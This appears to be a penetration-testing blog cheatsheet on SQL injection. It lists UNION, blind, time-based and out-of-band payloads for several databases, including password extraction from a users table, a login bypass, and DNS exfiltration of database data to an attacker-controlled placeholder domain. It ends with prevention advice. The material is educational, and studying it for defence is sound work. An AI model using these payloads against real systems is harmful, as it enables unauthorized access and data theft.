---
title: "SQLi attack"
subtitle: ""
date: 2020-03-04T15:58:26+08:00
lastmod: 2020-03-04T15:58:26+08:00
draft: false
author: "Hato0"
description: "SQL injection cheatsheet"

tags: ["web", "penetest", "sqli"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# SQL injection 

A SQL injection (SQLi) is a type of security exploit in which the attacker adds Structured Query Language (SQL) code to a Web form input box in order to gain access to unauthorized resources or make changes to sensitive data. 


An SQL query is a request for some action to be performed on a database. When executed correctly, a SQL injection can expose intellectual property, the personal information of customers, administrative credentials or private business details.

## SQLi Basics

Here will be some basics informations to get when you have a successfull injection

- SQL injection attack, querying the database type and version on Oracle
	- Depending on the DB you can get the version as follow:
		- Microsoft, MySQL
		{{< highlight sql "lineNos=false" >}}SELECT @@version{{< /highlight >}}
		- Oracle
		{{< highlight sql "lineNos=false" >}}SELECT * FROM v$version{{< /highlight >}}
		- PostgreSQL
		{{< highlight sql "lineNos=false" >}}SELECT version(){{< /highlight >}}
			
- SQL injection attack, listing the database contents 
	- Non-Oracle DB 
	    {{< highlight sql "lineNos=false" >}}select * from information\_schema.tables{{< /highlight >}}

	- Oracle DB
	    {{< highlight sql "lineNos=false" >}}select * from all_tables{{< /highlight >}}

## Union SQL attack 

These attacks are perform to extract data using the same amount of row than the initial result could display. For this attack, working conditions are:
-   The individual queries must return the same number of columns.
-   The data types in each column must be compatible between the individual queries

You can have those following examples : 

- Determining the number of columns returned by the query :
    - Using `Union` :
        {{< highlight sql "lineNos=false" >}}' union select NULL--{{< /highlight >}} 
        > Increasing number of NULL value until values are actually return
    - Using `Order` :
        {{< highlight sql "lineNos=false" >}}' order by 1--{{< /highlight >}}
        > Increasing the int value until an error occured
		
		
- Finding a column containing text
    {{< highlight sql "lineNos=false" >}}union select 'a', NULL, NULL, ...--{{< /highlight >}}
    > Add as many null as you need to match the number of columns
		
- Retrieving data from other tables
    {{< highlight sql "lineNos=false" >}}union select CHAMP1, CHAMP2, .... from TABLE_NAME--{{< /highlight >}}
    > Again add as many null value as needed
		
		
- Retrieving multiple values in a single column
    {{< highlight sql "lineNos=false" >}}union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME--{{< /highlight >}}
    > Very usefull when you only have the capacity to extract data from a uniq column
		
		

## Blind SQL attack 

- Conditional responses

	The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : 
	{{< highlight sql "lineNos=false" >}}' and (select substring(password,1,1) from users where username='administrator')='a{{< /highlight >}}

- Conditional errors

	The goal here is to check errors based on a True query and on a false one. 
    
    Here is an example:
    - True statement :
        {{< highlight sql "lineNos=false" >}}' and (select case when (1=2) then 1/0 else 'a' end)='a{{< /highlight >}}

    - False statement :
        {{< highlight sql "lineNos=false" >}}' and (select case when (1=1) then 1/0 else 'a' end)='a{{< /highlight >}}
	
	
- Time delays

    This one is the favorite of everyone to quickly check for blind SQL.  
    
    The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. 
    If there is one, and if this latence is proportionate to your sleep value, then you know that you've got SQLi. 
    
    Examples : 
	
    - Using `sleep`:
        {{< highlight sql "lineNos=false" >}}';sleep(10)--{{< /highlight >}}
	- Using `waitfor` : 
        {{< highlight sql "lineNos=false" >}}'; if (1=1) waitfor delay '0:0:5'--{{< /highlight >}}
	
- Time delays and information retrieval

	Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. 

    Here is an example : 
    {{< highlight sql "lineNos=false" >}}
    '; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '0:0:5'--{{< /highlight >}}


- Out-of-band (OAST)

    This type of SQLi is perform against asynchronous system. 
    
    The goal here is to trigger out-of-band network. We usually use DNS protocol because that's simplier and available on any system. 
    
    To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. 
    Basicly we will redirect to our controlled domain on True or False condition. 
    
    For example we can perform those :
    - For Microsoft SQL Server	
        - Basic test:
            {{< highlight sql "lineNos=false" >}}'; exec master..xp\_dirtree '//MYDOMAIN/a'--{{< /highlight >}}

		- Data on subdomain:
            {{< highlight sql "lineNos=false" >}}declare @q varchar(1024); set @q = 'master..xp\_dirtree '\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\_name()), 1),1,60) + '.MYDOMAIN\\foo'; exec(@q){{< /highlight >}}

    - MYSQL
        Check for the LOAD\_FILE, sys\_eval, http\_get, .. functions
	   
	- ORACLE
        {{< highlight sql "lineNos=false" >}}select dbms_ldap.init((select version from v$instance)||'.'||(select user from 		dual)||'.'||(select name from 	v$database)||'.'|'MYDOMAIN',80) from 	dual;{{< /highlight >}}


- SQL injection vulnerability allowing login bypass
	* Very simple : `username'--`

## How to prevent them 

If a SQL injection attack is successfully carried out, the damage could be expensive in terms of resources and customer trust. That is why detecting this type of attack in a timely manner is important. Web application firewalls (WAF) are the most common tool used to filter out SQLi attacks. WAFs are based on a library of updated attack signatures and can be configured to flag malicious SQL queries.

In order to prevent a SQL injection attack from occurring in the first place, developers can follow these practices:

-   Avoid SQL statements that allow user input, choose prepared statements and parameterized queries instead.
-   Perform input validation, or sanitization, for user-provided arguments.
-   Do not leave sensitive data in plaintext format, or use encryption.
-   Limit database permissions, privileges and capabilities to the bare minimum.
-   Keep databases updated on security patches.
-   Routinely test the security measures of applications that rely on databases.
-   Remove the display of database error messages to the users.